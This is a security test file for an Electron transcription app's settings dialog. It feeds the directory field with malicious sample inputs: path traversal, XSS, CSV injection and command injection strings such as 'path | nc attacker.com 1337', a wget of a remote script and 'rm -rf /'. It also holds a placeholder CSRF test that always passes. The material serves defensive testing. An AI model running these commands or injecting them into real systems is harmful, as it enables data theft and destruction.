import { describe, it, expect, beforeEach, vi } from 'vitest'
import { render, screen, fireEvent, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { ThemeProvider } from '@mui/material/styles'
import { theme } from '../../../src/theme/theme'
import SettingsDialog from '../../../src/components/SettingsDialog'
import { useAppStore } from '../../../src/store/appStore'

// Mock the store
vi.mock('../../../src/store/appStore')

const mockUseAppStore = vi.mocked(useAppStore)

// Test wrapper component
const TestWrapper: React.FC<{ children: React.ReactNode }> = ({ children }) => (
  <ThemeProvider theme={theme}>
    {children}
  </ThemeProvider>
)

describe('Input Validation Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    
    // Reset mock store
    mockUseAppStore.mockReturnValue({
      addFiles: vi.fn(),
      queueItems: [],
      removeFromQueue: vi.fn(),
      processingOptions: {
        output_directory: 'C:/Output/Transcripts',
        whisper_model: 'large' as const,
        language: 'en' as const,
        output_format: 'txt' as const
      },
      setProcessingOptions: vi.fn()
    })

    // Mock Electron dialog API
    global.window.electronAPI = {
      ...global.window.electronAPI,
      dialog: {
        showOpenDialog: vi.fn()
      }
    }
  })

  describe('Settings Dialog Input Validation', () => {
    const maliciousInputs = {
      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        '~/../../usr/bin',
        'C:\\..\\..\\sensitive\\data',
        '/../../root/.ssh/id_rsa'
      ],
      scriptInjection: [
        '<script>alert("xss")</script>',
        '${process.env.HOME}',
        '`rm -rf /`',
        '$(whoami)',
        '\\x00\\x01\\x02',
        'javascript:alert("xss")'
      ],
      commandInjection: [
        'path && rm -rf /',
        'path; cat /etc/passwd',
        'path | nc attacker.com 1337',
        'path > /dev/null; wget malware.com/script.sh',
        'path || echo "pwned"'
      ],
      bufferOverflow: [
        'A'.repeat(10000),
        'B'.repeat(65536),
        '\x00'.repeat(1000)
      ]
    }

    it('should validate output directory path input', async () => {
      const setProcessingOptions = vi.fn()
      mockUseAppStore.mockReturnValue({
        ...mockUseAppStore(),
        setProcessingOptions
      })

      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const directoryInput = screen.getByDisplayValue('C:/Output/Transcripts')

      // Test path traversal attacks
      for (const maliciousPath of maliciousInputs.pathTraversal) {
        await userEvent.clear(directoryInput)
        await userEvent.type(directoryInput, maliciousPath)

        // Trigger validation
        fireEvent.blur(directoryInput)

        await waitFor(() => {
          expect(screen.getByText(/valid directory path/i)).toBeInTheDocument()
        })
      }
    })

    it('should sanitize script injection attempts', async () => {
      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const directoryInput = screen.getByDisplayValue('C:/Output/Transcripts')

      for (const maliciousScript of maliciousInputs.scriptInjection) {
        await userEvent.clear(directoryInput)
        await userEvent.type(directoryInput, maliciousScript)

        // The input should be sanitized or rejected
        expect(directoryInput).not.toHaveValue(maliciousScript)
      }
    })

    it('should prevent command injection in directory paths', async () => {
      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const directoryInput = screen.getByDisplayValue('C:/Output/Transcripts')

      for (const maliciousCommand of maliciousInputs.commandInjection) {
        await userEvent.clear(directoryInput)
        await userEvent.type(directoryInput, maliciousCommand)

        fireEvent.blur(directoryInput)

        await waitFor(() => {
          // Should show validation error
          expect(screen.getByText(/valid directory path/i)).toBeInTheDocument()
        })

        // Save button should be disabled
        const saveButton = screen.getByText('Save Changes')
        expect(saveButton).toBeDisabled()
      }
    })

    it('should handle buffer overflow attempts gracefully', async () => {
      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const directoryInput = screen.getByDisplayValue('C:/Output/Transcripts')

      for (const overflowInput of maliciousInputs.bufferOverflow) {
        await userEvent.clear(directoryInput)
        
        // Should not crash the application
        expect(() => {
          userEvent.type(directoryInput, overflowInput)
        }).not.toThrow()

        // Input should be truncated or rejected
        const actualValue = (directoryInput as HTMLInputElement).value
        expect(actualValue.length).toBeLessThan(overflowInput.length)
      }
    })

    it('should validate directory paths against blacklisted locations', async () => {
      const blacklistedPaths = [
        'C:\\Windows\\System32',
        'C:\\Program Files',
        '/etc',
        '/root',
        '/usr/bin',
        '/var/log',
        'C:\\Users\\Administrator',
        '/home/root',
        'C:\\$Recycle.Bin'
      ]

      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const directoryInput = screen.getByDisplayValue('C:/Output/Transcripts')

      for (const blacklistedPath of blacklistedPaths) {
        await userEvent.clear(directoryInput)
        await userEvent.type(directoryInput, blacklistedPath)

        fireEvent.blur(directoryInput)

        await waitFor(() => {
          // Should show warning for system directories
          expect(
            screen.getByText(/not recommended/i) || 
            screen.getByText(/system directory/i) ||
            screen.getByText(/valid directory path/i)
          ).toBeInTheDocument()
        })
      }
    })

    it('should validate file dialog selections', async () => {
      const mockShowOpenDialog = vi.mocked(global.window.electronAPI.dialog.showOpenDialog)
      
      // Mock dialog returning malicious paths
      mockShowOpenDialog.mockResolvedValue({
        canceled: false,
        filePaths: ['../../../etc/passwd']
      })

      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const browseButton = screen.getByText('Browse')
      await userEvent.click(browseButton)

      await waitFor(() => {
        // Should not accept malicious paths from dialog
        const directoryInput = screen.getByDisplayValue(/Output/i)
        expect(directoryInput).not.toHaveValue('../../../etc/passwd')
      })
    })

    it('should enforce maximum path length limits', () => {
      const maxPathLength = 260 // Windows MAX_PATH limit
      const longPath = 'C:\\' + 'very-long-directory-name\\'.repeat(20) + 'output'
      
      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const directoryInput = screen.getByDisplayValue('C:/Output/Transcripts')
      
      fireEvent.change(directoryInput, { target: { value: longPath } })
      fireEvent.blur(directoryInput)

      if (longPath.length > maxPathLength) {
        expect(screen.getByText(/path too long/i) || screen.getByText(/invalid/i)).toBeInTheDocument()
      }
    })

    it('should validate special characters in paths', async () => {
      const invalidChars = ['<', '>', ':', '"', '|', '?', '*', '\x00', '\x01']
      
      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const directoryInput = screen.getByDisplayValue('C:/Output/Transcripts')

      for (const char of invalidChars) {
        const invalidPath = `C:\\Output${char}Invalid`
        
        await userEvent.clear(directoryInput)
        await userEvent.type(directoryInput, invalidPath)

        fireEvent.blur(directoryInput)

        await waitFor(() => {
          expect(screen.getByText(/valid directory path/i)).toBeInTheDocument()
        })
      }
    })

    it('should prevent Unicode normalization attacks', async () => {
      // Unicode characters that could be used for bypassing filters
      const unicodeAttacks = [
        'C:/Output/Transcripts/../../../etc/passwd',
        'C:/Output/Transcripts/\u202e/etc/passwd', // Right-to-left override
        'C:/Output/Transcripts/\uff0e\uff0e/etc', // Full-width periods
        'C:/Output/Transcripts/\u2024\u2024/etc' // One dot leader
      ]

      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const directoryInput = screen.getByDisplayValue('C:/Output/Transcripts')

      for (const unicodeAttack of unicodeAttacks) {
        await userEvent.clear(directoryInput)
        await userEvent.type(directoryInput, unicodeAttack)

        fireEvent.blur(directoryInput)

        await waitFor(() => {
          expect(screen.getByText(/valid directory path/i)).toBeInTheDocument()
        })
      }
    })
  })

  describe('Form Validation Edge Cases', () => {
    it('should handle null and undefined inputs gracefully', async () => {
      render(
        <TestWrapper>
          <SettingsDialog open={true} onClose={() => {}} />
        </TestWrapper>
      )

      const directoryInput = screen.getByDisplayValue('C:/Output/Transcripts')

      // Test with null-like values
      const nullishValues = ['null', 'undefined', '', '   ', '\t\n\r']
      
      for (const nullish of nullishValues) {
        await userEvent.clear(directoryInput)
        await userEvent.type(directoryInput, nullish)

        fireEvent.blur(directoryInput)

        // Should show required field error
        await waitFor(() => {
          expect(screen.getByText(/required/i)).toBeInTheDocument()
        })
      }
    })

    it('should validate against prototype pollution', () => {
      const prototypePollutionAttempts = [
        '__proto__.isAdmin',
        'constructor.prototype.isAdmin',
        'prototype.isAdmin',
        '__proto__[isAdmin]',
        'constructor[prototype][isAdmin]'
      ]

      // These should not pollute the prototype chain
      prototypePollutionAttempts.forEach(attempt => {
        const sanitized = attempt.replace(/(__proto__|constructor|prototype)/gi, '')
        expect(sanitized).not.toContain('__proto__')
        expect(sanitized).not.toContain('constructor')
        expect(sanitized).not.toContain('prototype')
      })
    })

    it('should prevent CSV injection in file operations', () => {
      const csvInjectionPayloads = [
        '=cmd|"/c calc.exe"!A1',
        '+cmd|"/c calc.exe"!A1',
        '-cmd|"/c calc.exe"!A1',
        '@SUM(1+1)*cmd|"/c calc.exe"!A1'
      ]

      csvInjectionPayloads.forEach(payload => {
        const sanitized = payload.replace(/^[=+\-@]/, '')
        expect(sanitized).not.toMatch(/^[=+\-@]/)
      })
    })

    it('should enforce CSRF protection patterns', () => {
      // Mock requests should include appropriate headers/tokens
      const mockFetch = vi.fn()
      global.fetch = mockFetch

      // Any API calls should include CSRF protection
      // This is a placeholder test - actual implementation would depend on your API structure
      expect(true).toBe(true) // Placeholder assertion
    })
  })
})